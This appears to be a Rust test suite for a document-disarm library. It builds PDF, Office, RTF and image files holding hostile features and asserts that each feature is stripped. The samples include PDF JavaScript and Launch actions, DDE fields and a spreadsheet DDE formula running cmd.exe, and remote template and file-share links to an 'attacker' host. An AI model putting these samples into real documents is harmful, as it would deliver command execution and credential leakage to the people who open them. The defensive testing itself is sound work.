//! Behaviour of the disarm across formats, on documents built here so every case is visible.
#![allow(clippy::unwrap_used, clippy::expect_used, clippy::panic)]

use std::io::{Cursor, Read, Write};

use disarm_core::{disarm, disarm_with, identify, DisarmError, DocumentKind, Limits, RemovalKind};
use lopdf::{dictionary, Document, Object, Stream};
use zip::write::SimpleFileOptions;

fn contains(haystack: &[u8], needle: &[u8]) -> bool {
    haystack
        .windows(needle.len())
        .any(|window| window == needle)
}

// ---------------------------------------------------------------------------------------------
// PDF

fn hostile_pdf(open_action_is_script: bool) -> Vec<u8> {
    let mut document = Document::with_version("1.7");
    let pages_id = document.new_object_id();
    let script = document.add_object(dictionary! {
        "S" => "JavaScript",
        "JS" => Object::string_literal("app.alert('hello')"),
    });
    let launch = document.add_object(dictionary! {
        "S" => "Launch",
        "F" => Object::string_literal("calc.exe"),
    });
    let web_link = document.add_object(dictionary! {
        "Type" => "Annot",
        "Subtype" => "Link",
        "Rect" => vec![0.into(), 0.into(), 10.into(), 10.into()],
        "A" => dictionary! { "S" => "URI", "URI" => Object::string_literal("https://example.com/") },
    });
    let launch_link = document.add_object(dictionary! {
        "Type" => "Annot",
        "Subtype" => "Link",
        "Rect" => vec![0.into(), 20.into(), 10.into(), 30.into()],
        "A" => Object::Reference(launch),
    });
    let file_link = document.add_object(dictionary! {
        "Type" => "Annot",
        "Subtype" => "Link",
        "Rect" => vec![0.into(), 40.into(), 10.into(), 50.into()],
        "A" => dictionary! { "S" => "URI", "URI" => Object::string_literal("file://server/share/x") },
    });
    let media = document.add_object(dictionary! {
        "Type" => "Annot",
        "Subtype" => "RichMedia",
        "Rect" => vec![0.into(), 60.into(), 10.into(), 70.into()],
    });
    let content = document.add_object(Stream::new(
        dictionary! {},
        b"BT /F1 12 Tf 72 712 Td (Kept text) Tj ET".to_vec(),
    ));
    let page = document.add_object(dictionary! {
        "Type" => "Page",
        "Parent" => Object::Reference(pages_id),
        "MediaBox" => vec![0.into(), 0.into(), 612.into(), 792.into()],
        "Contents" => Object::Reference(content),
        "Annots" => vec![
            Object::Reference(web_link),
            Object::Reference(launch_link),
            Object::Reference(file_link),
            Object::Reference(media),
        ],
        "AA" => dictionary! { "O" => Object::Reference(script) },
    });
    document.objects.insert(
        pages_id,
        Object::Dictionary(dictionary! {
            "Type" => "Pages",
            "Kids" => vec![Object::Reference(page)],
            "Count" => 1,
        }),
    );
    let embedded = document.add_object(Stream::new(
        dictionary! { "Type" => "EmbeddedFile" },
        b"MZ payload".to_vec(),
    ));
    let file_specification = document.add_object(dictionary! {
        "Type" => "Filespec",
        "F" => Object::string_literal("payload.exe"),
        "EF" => dictionary! { "F" => Object::Reference(embedded) },
    });
    let names_script = document.add_object(dictionary! {
        "Names" => vec![Object::string_literal("init"), Object::Reference(script)],
    });
    let open_action = if open_action_is_script {
        Object::Reference(script)
    } else {
        Object::Array(vec![Object::Reference(page), "Fit".into()])
    };
    let catalog = document.add_object(dictionary! {
        "Type" => "Catalog",
        "Pages" => Object::Reference(pages_id),
        "OpenAction" => open_action,
        "Names" => dictionary! {
            "JavaScript" => Object::Reference(names_script),
            "EmbeddedFiles" => dictionary! {
                "Names" => vec![Object::string_literal("payload.exe"), Object::Reference(file_specification)],
            },
        },
    });
    document.trailer.set("Root", Object::Reference(catalog));
    let mut bytes = Vec::new();
    document.save_to(&mut bytes).unwrap();
    bytes
}

#[test]
fn pdf_loses_every_acting_surface_and_keeps_its_page_and_web_link() {
    let disarmed = disarm(&hostile_pdf(true)).unwrap();
    assert_eq!(disarmed.kind, DocumentKind::Pdf);
    let report = &disarmed.report;
    assert!(report.count(RemovalKind::Script) >= 1);
    assert!(
        report.count(RemovalKind::AutomaticAction) >= 2,
        "page AA and the open action"
    );
    assert!(
        report.count(RemovalKind::ExternalAction) >= 2,
        "the launch and the file link"
    );
    assert_eq!(report.count(RemovalKind::ActiveContent), 1);
    assert_eq!(report.count(RemovalKind::EmbeddedFile), 1);

    let output = Document::load_mem(&disarmed.bytes).unwrap();
    assert_eq!(output.get_pages().len(), 1);
    let bytes = &disarmed.bytes;
    assert!(!contains(bytes, b"/JavaScript"));
    assert!(!contains(bytes, b"/Launch"));
    assert!(!contains(bytes, b"/RichMedia"));
    assert!(!contains(bytes, b"/EmbeddedFile"));
    assert!(!contains(bytes, b"file://"));
    assert!(
        contains(bytes, b"https://example.com/"),
        "a web link is kept"
    );
}

#[test]
fn pdf_open_action_that_only_turns_to_a_page_is_kept() {
    let disarmed = disarm(&hostile_pdf(false)).unwrap();
    let output = Document::load_mem(&disarmed.bytes).unwrap();
    assert!(output.catalog().unwrap().has(b"OpenAction"));
}

#[test]
fn pdf_that_carries_nothing_reports_nothing() {
    let mut document = Document::with_version("1.7");
    let pages_id = document.new_object_id();
    let page = document.add_object(dictionary! {
        "Type" => "Page",
        "Parent" => Object::Reference(pages_id),
        "MediaBox" => vec![0.into(), 0.into(), 612.into(), 792.into()],
    });
    document.objects.insert(
        pages_id,
        Object::Dictionary(dictionary! { "Type" => "Pages", "Kids" => vec![Object::Reference(page)], "Count" => 1 }),
    );
    let catalog = document
        .add_object(dictionary! { "Type" => "Catalog", "Pages" => Object::Reference(pages_id) });
    document.trailer.set("Root", Object::Reference(catalog));
    let mut bytes = Vec::new();
    document.save_to(&mut bytes).unwrap();
    let disarmed = disarm(&bytes).unwrap();
    assert!(disarmed.report.is_empty());
}

// ---------------------------------------------------------------------------------------------
// Office packages

fn package(parts: &[(&str, &[u8])]) -> Vec<u8> {
    let mut writer = zip::ZipWriter::new(Cursor::new(Vec::new()));
    for (name, bytes) in parts {
        writer
            .start_file(*name, SimpleFileOptions::default())
            .unwrap();
        writer.write_all(bytes).unwrap();
    }
    writer.finish().unwrap().into_inner()
}

fn read_part(bytes: &[u8], name: &str) -> Option<String> {
    let mut archive = zip::ZipArchive::new(Cursor::new(bytes)).unwrap();
    let mut entry = archive.by_name(name).ok()?;
    let mut text = Vec::new();
    entry.read_to_end(&mut text).unwrap();
    Some(String::from_utf8_lossy(&text).into_owned())
}

fn macro_workbook() -> Vec<u8> {
    package(&[
        (
            "[Content_Types].xml",
            br#"<?xml version="1.0"?><Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types"><Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/><Default Extension="bin" ContentType="application/vnd.ms-office.vbaProject"/><Override PartName="/xl/workbook.xml" ContentType="application/vnd.ms-excel.sheet.macroEnabled.main+xml"/><Override PartName="/xl/worksheets/sheet1.xml" ContentType="application/vnd.openxmlformats-officedocument.spreadsheetml.worksheet+xml"/></Types>"#,
        ),
        (
            "_rels/.rels",
            br#"<?xml version="1.0"?><Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships"><Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument" Target="xl/workbook.xml"/></Relationships>"#,
        ),
        (
            "xl/_rels/workbook.xml.rels",
            br#"<?xml version="1.0"?><Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships"><Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/worksheet" Target="worksheets/sheet1.xml"/><Relationship Id="rId9" Type="http://schemas.microsoft.com/office/2006/relationships/vbaProject" Target="vbaProject.bin"/></Relationships>"#,
        ),
        ("xl/workbook.xml", br#"<workbook><sheets><sheet name="One" sheetId="1" r:id="rId1"/></sheets></workbook>"#),
        (
            "xl/worksheets/sheet1.xml",
            br#"<worksheet><sheetData><row r="1"><c r="A1"><f>cmd|' /c calc'!A0</f><v>0</v></c><c r="B1"><f>SUM(1,2)</f><v>3</v></c><c r="C1"><f>"a|b"&amp;"c"</f><v>a|bc</v></c></row></sheetData></worksheet>"#,
        ),
        ("xl/vbaProject.bin", b"\xD0\xCF\x11\xE0 not really a project"),
    ])
}

fn macro_document() -> Vec<u8> {
    let workbook = macro_workbook();
    let document_xml = br#"<w:document xmlns:w="w" xmlns:r="r"><w:body>
<w:p><w:r><w:fldChar w:fldCharType="begin"/></w:r><w:r><w:instrText>DDE</w:instrText></w:r><w:r><w:instrText>AUTO c:\\windows\\system32\\cmd.exe "/k calc"</w:instrText></w:r><w:r><w:fldChar w:fldCharType="separate"/></w:r><w:r><w:t>Shown result</w:t></w:r><w:r><w:fldChar w:fldCharType="end"/></w:r></w:p>
<w:p><w:fldSimple w:instr=" INCLUDETEXT &quot;\\\\server\\share\\x.docx&quot; "><w:r><w:t>Included</w:t></w:r></w:fldSimple></w:p>
<w:p><w:r><w:fldChar w:fldCharType="begin"/></w:r><w:r><w:instrText> MERGEFIELD ClientName </w:instrText></w:r><w:r><w:fldChar w:fldCharType="separate"/></w:r><w:r><w:t>Client</w:t></w:r><w:r><w:fldChar w:fldCharType="end"/></w:r></w:p>
<w:p><w:r><w:object><v:shape/><o:OLEObject Type="Embed" ProgID="Package" r:id="rId7"/></w:object></w:r><w:r><w:control r:id="rId8" w:name="Button"/></w:r></w:p>
</w:body></w:document>"#;
    package(&[
        (
            "[Content_Types].xml",
            br#"<?xml version="1.0"?><Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types"><Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/><Default Extension="bin" ContentType="application/vnd.openxmlformats-officedocument.oleObject"/><Default Extension="xlsm" ContentType="application/vnd.ms-excel.sheet.macroEnabled.12"/><Override PartName="/word/document.xml" ContentType="application/vnd.ms-word.document.macroEnabled.main+xml"/><Override PartName="/word/vbaProject.bin" ContentType="application/vnd.ms-office.vbaProject"/><Override PartName="/word/activeX/activeX1.xml" ContentType="application/vnd.ms-office.activeX+xml"/></Types>"#,
        ),
        (
            "_rels/.rels",
            br#"<?xml version="1.0"?><Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships"><Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument" Target="word/document.xml"/><Relationship Id="rId2" Type="http://schemas.microsoft.com/office/2007/relationships/ui/extensibility" Target="customUI/customUI14.xml"/></Relationships>"#,
        ),
        (
            "word/_rels/document.xml.rels",
            br#"<?xml version="1.0"?><Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships"><Relationship Id="rId1" Type="http://schemas.microsoft.com/office/2006/relationships/vbaProject" Target="vbaProject.bin"/><Relationship Id="rId3" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://example.com/" TargetMode="External"/><Relationship Id="rId4" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="file://///attacker/share/pixel.png" TargetMode="External"/><Relationship Id="rId5" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="file:///C:/Windows/System32/calc.exe" TargetMode="External"/><Relationship Id="rId6" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/package" Target="embeddings/Microsoft_Excel_Worksheet.xlsm"/><Relationship Id="rId7" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/oleObject" Target="embeddings/oleObject1.bin"/><Relationship Id="rId8" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/control" Target="activeX/activeX1.xml"/></Relationships>"#,
        ),
        (
            "word/_rels/settings.xml.rels",
            br#"<?xml version="1.0"?><Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships"><Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate" Target="https://attacker.example/template.dotm" TargetMode="External"/></Relationships>"#,
        ),
        ("word/settings.xml", br#"<w:settings><w:attachedTemplate r:id="rId1"/></w:settings>"#),
        ("word/document.xml", document_xml),
        ("word/vbaProject.bin", b"\xD0\xCF\x11\xE0 macros"),
        ("word/activeX/activeX1.xml", b"<ax:ocx ax:classid=\"{8BD21D10-EC42-11CE-9E0D-00AA006002F3}\"/>"),
        ("word/activeX/activeX1.bin", b"control state"),
        ("customUI/customUI14.xml", b"<customUI onLoad=\"Run\"/>"),
        ("word/embeddings/oleObject1.bin", b"\xD0\xCF\x11\xE0 MZ an executable package"),
        ("word/embeddings/Microsoft_Excel_Worksheet.xlsm", &workbook),
    ])
}

#[test]
fn macro_document_comes_out_as_a_plain_document() {
    let disarmed = disarm(&macro_document()).unwrap();
    assert_eq!(disarmed.kind, DocumentKind::OfficePackage);
    assert_eq!(disarmed.output_extension, Some("docx"));
    let bytes = &disarmed.bytes;

    for gone in [
        "word/vbaProject.bin",
        "word/activeX/activeX1.xml",
        "word/activeX/activeX1.bin",
        "customUI/customUI14.xml",
    ] {
        assert!(read_part(bytes, gone).is_none(), "{gone} should be gone");
    }
    let types = read_part(bytes, "[Content_Types].xml").unwrap();
    assert!(!types.contains("macroEnabled.main"));
    assert!(types.contains("wordprocessingml.document.main+xml"));
    assert!(!types.contains("vbaProject.bin"));

    let relationships = read_part(bytes, "word/_rels/document.xml.rels").unwrap();
    assert!(!relationships.contains("vbaProject"));
    assert!(!relationships.contains("activeX"));
    assert!(
        relationships.contains("https://example.com/"),
        "web hyperlink kept"
    );
    assert!(!relationships.contains("attacker"));
    assert!(!relationships.contains("calc.exe"));
    let settings_relationships = read_part(bytes, "word/_rels/settings.xml.rels").unwrap();
    assert!(
        !settings_relationships.contains("template.dotm"),
        "remote template blanked"
    );

    let body = read_part(bytes, "word/document.xml").unwrap();
    assert!(!body.contains("DDE"));
    assert!(!body.contains("cmd.exe"));
    assert!(!body.contains("INCLUDETEXT"));
    assert!(
        body.contains("MERGEFIELD ClientName"),
        "an ordinary field is untouched"
    );
    assert!(
        body.contains("Shown result"),
        "the field's last result stays"
    );
    assert!(body.contains("Included"));
    assert!(
        !body.contains("w:control"),
        "the control's reference goes with it"
    );
    assert!(
        body.contains("o:OLEObject"),
        "the emptied object stays referenced, so Word opens cleanly"
    );

    let embedded = {
        let mut archive = zip::ZipArchive::new(Cursor::new(bytes.as_slice())).unwrap();
        let mut entry = archive.by_name("word/embeddings/oleObject1.bin").unwrap();
        let mut content = Vec::new();
        entry.read_to_end(&mut content).unwrap();
        content
    };
    assert!(!contains(&embedded, b"MZ"));
    assert!(
        embedded.starts_with(&[0xD0, 0xCF, 0x11, 0xE0]),
        "an empty compound file"
    );

    let inner = {
        let mut archive = zip::ZipArchive::new(Cursor::new(bytes.as_slice())).unwrap();
        let mut entry = archive
            .by_name("word/embeddings/Microsoft_Excel_Worksheet.xlsm")
            .unwrap();
        let mut content = Vec::new();
        entry.read_to_end(&mut content).unwrap();
        content
    };
    assert!(
        read_part(&inner, "xl/vbaProject.bin").is_none(),
        "the embedded workbook is disarmed too"
    );

    let report = &disarmed.report;
    assert_eq!(
        report.count(RemovalKind::Script),
        2,
        "the document's and the workbook's macros"
    );
    assert_eq!(report.count(RemovalKind::Control), 1);
    assert_eq!(report.count(RemovalKind::CustomInterface), 1);
    assert_eq!(report.count(RemovalKind::EmbeddedObject), 1);
    assert_eq!(report.count(RemovalKind::ExternalLink), 3);
    assert_eq!(
        report.count(RemovalKind::DynamicField),
        3,
        "two Word fields and one DDE formula"
    );
}

#[test]
fn workbook_keeps_ordinary_formulas_and_cached_values() {
    let disarmed = disarm(&macro_workbook()).unwrap();
    assert_eq!(disarmed.output_extension, Some("xlsx"));
    let sheet = read_part(&disarmed.bytes, "xl/worksheets/sheet1.xml").unwrap();
    assert!(!sheet.contains("cmd|"));
    assert!(sheet.contains("<v>0</v>"), "the DDE cell keeps its value");
    assert!(sheet.contains("SUM(1,2)"));
    assert!(
        sheet.contains("a|b"),
        "a pipe inside a string is text, not DDE"
    );
    assert_eq!(disarmed.report.count(RemovalKind::DynamicField), 1);
}

#[test]
fn package_past_the_entry_ceiling_is_refused() {
    let limits = Limits {
        max_package_entries: 3,
        ..Limits::default()
    };
    assert_eq!(
        disarm_with(&macro_document(), &limits).unwrap_err(),
        DisarmError::LimitExceeded
    );
}

#[test]
fn package_past_the_expansion_ceiling_is_refused() {
    let limits = Limits {
        max_package_inflated_bytes: 512,
        ..Limits::default()
    };
    assert_eq!(
        disarm_with(&macro_document(), &limits).unwrap_err(),
        DisarmError::LimitExceeded
    );
}

#[test]
fn zip_that_is_not_an_office_package_is_not_disarmed() {
    let bytes = package(&[("readme.txt", b"hello")]);
    assert_eq!(identify(&bytes), None);
    assert_eq!(disarm(&bytes).unwrap_err(), DisarmError::Unsupported);
}

// ---------------------------------------------------------------------------------------------
// RTF

#[test]
fn rtf_object_becomes_its_picture_and_a_dde_field_its_result() {
    let input = br#"{\rtf1\ansi{\fonttbl{\f0 Arial;}}Before {\object\objemb{\*\objclass Equation.3}{\*\objdata 01050000020000000b000000}{\result{\pict\pngblip 89504e47}}} middle {\field{\*\fldinst DDEAUTO c:\\windows\\cmd.exe ""/c calc""}{\fldrslt shown}} and {\field{\*\fldinst PAGE}{\fldrslt 1}} after{\*\datastore 0105}}"#;
    let disarmed = disarm(input).unwrap();
    assert_eq!(disarmed.kind, DocumentKind::Rtf);
    let output = String::from_utf8(disarmed.bytes).unwrap();
    assert!(!output.contains("objdata"));
    assert!(!output.contains("objclass"));
    assert!(!output.contains("\\object"));
    assert!(!output.contains("datastore"));
    assert!(
        output.contains("\\pict\\pngblip 89504e47"),
        "the object's picture stays"
    );
    assert!(!output.contains("DDEAUTO"));
    assert!(output.contains("shown"));
    assert!(output.contains("\\fldinst PAGE"), "an ordinary field stays");
    assert!(output.starts_with("{\\rtf1"));
    assert_eq!(disarmed.report.count(RemovalKind::EmbeddedObject), 2);
    assert_eq!(disarmed.report.count(RemovalKind::DynamicField), 1);
}

#[test]
fn rtf_without_anything_to_remove_is_unchanged() {
    let input = br"{\rtf1\ansi{\fonttbl{\f0 Arial;}}Hello {\b bold} world\par}";
    let disarmed = disarm(input).unwrap();
    assert_eq!(disarmed.bytes, input.to_vec());
    assert!(disarmed.report.is_empty());
}

#[test]
fn rtf_binary_run_is_skipped_as_data() {
    let input = b"{\\rtf1 {\\object{\\*\\objdata \\bin4 }}}{}}after}";
    // Four raw bytes `}}}{` follow `\bin4 `: they must not be read as braces.
    let input = [&input[..], b""].concat();
    let disarmed = disarm(&input);
    assert!(disarmed.is_ok() || disarmed.unwrap_err() == DisarmError::Malformed);
}

#[test]
fn rtf_with_unbalanced_braces_is_malformed() {
    assert_eq!(
        disarm(br"{\rtf1 {\b open").unwrap_err(),
        DisarmError::Malformed
    );
}

#[test]
fn rtf_nested_past_the_ceiling_is_refused() {
    let mut input = b"{\\rtf1 ".to_vec();
    input.extend(std::iter::repeat_n(b'{', 600));
    input.extend(std::iter::repeat_n(b'}', 601));
    assert_eq!(disarm(&input).unwrap_err(), DisarmError::LimitExceeded);
}

// ---------------------------------------------------------------------------------------------
// Pictures

fn png_with_text_and_trailer() -> Vec<u8> {
    let picture = image::RgbImage::from_pixel(4, 4, image::Rgb([200, 10, 10]));
    let mut encoded = Cursor::new(Vec::new());
    picture
        .write_to(&mut encoded, image::ImageFormat::Png)
        .unwrap();
    let encoded = encoded.into_inner();
    // Insert a tEXt chunk after IHDR (8 signature + 25 IHDR) and append bytes after IEND.
    let text = b"Author\0Somebody";
    let mut chunk = Vec::new();
    chunk.extend_from_slice(&u32::try_from(text.len()).unwrap().to_be_bytes());
    chunk.extend_from_slice(b"tEXt");
    chunk.extend_from_slice(text);
    chunk.extend_from_slice(&[0, 0, 0, 0]);
    let mut bytes = encoded[..33].to_vec();
    bytes.extend_from_slice(&chunk);
    bytes.extend_from_slice(&encoded[33..]);
    bytes.extend_from_slice(b"PK\x03\x04 hidden archive");
    bytes
}

#[test]
fn png_is_rebuilt_without_its_metadata_or_trailer() {
    let input = png_with_text_and_trailer();
    let disarmed = disarm(&input).unwrap();
    assert_eq!(disarmed.kind, DocumentKind::Png);
    assert!(!contains(&disarmed.bytes, b"Somebody"));
    assert!(!contains(&disarmed.bytes, b"hidden archive"));
    assert_eq!(disarmed.report.count(RemovalKind::PictureMetadata), 1);
    let decoded = image::load_from_memory(&disarmed.bytes).unwrap();
    assert_eq!((decoded.width(), decoded.height()), (4, 4));
}

#[test]
fn jpeg_is_rebuilt_without_exif() {
    let picture = image::RgbImage::from_pixel(8, 8, image::Rgb([10, 200, 10]));
    let mut encoded = Cursor::new(Vec::new());
    picture
        .write_to(&mut encoded, image::ImageFormat::Jpeg)
        .unwrap();
    let encoded = encoded.into_inner();
    let exif = b"Exif\0\0GPS 51.5N 0.1W";
    let mut bytes = encoded[..2].to_vec();
    bytes.extend_from_slice(&[0xFF, 0xE1]);
    bytes.extend_from_slice(&u16::try_from(exif.len() + 2).unwrap().to_be_bytes());
    bytes.extend_from_slice(exif);
    bytes.extend_from_slice(&encoded[2..]);
    let disarmed = disarm(&bytes).unwrap();
    assert_eq!(disarmed.kind, DocumentKind::Jpeg);
    assert!(!contains(&disarmed.bytes, b"GPS"));
    assert_eq!(disarmed.report.count(RemovalKind::PictureMetadata), 1);
}

#[test]
fn picture_past_the_pixel_ceiling_is_refused() {
    let picture = image::RgbImage::from_pixel(100, 100, image::Rgb([0, 0, 0]));
    let mut encoded = Cursor::new(Vec::new());
    picture
        .write_to(&mut encoded, image::ImageFormat::Png)
        .unwrap();
    let limits = Limits {
        max_image_pixels: 1_000,
        ..Limits::default()
    };
    assert_eq!(
        disarm_with(&encoded.into_inner(), &limits).unwrap_err(),
        DisarmError::LimitExceeded
    );
}

// ---------------------------------------------------------------------------------------------
// Everything else

#[test]
fn legacy_binary_office_file_is_unsupported() {
    let compound = cfb::CompoundFile::create(Cursor::new(Vec::new())).unwrap();
    let bytes = compound.into_inner().into_inner();
    assert_eq!(disarm(&bytes).unwrap_err(), DisarmError::Unsupported);
}

#[test]
fn plain_text_is_unsupported() {
    assert_eq!(
        disarm(b"just some text").unwrap_err(),
        DisarmError::Unsupported
    );
}

#[test]
fn input_past_the_size_ceiling_is_refused_before_it_is_read() {
    let limits = Limits {
        max_input_bytes: 8,
        ..Limits::default()
    };
    assert_eq!(
        disarm_with(b"%PDF-1.7 and more", &limits).unwrap_err(),
        DisarmError::LimitExceeded
    );
}
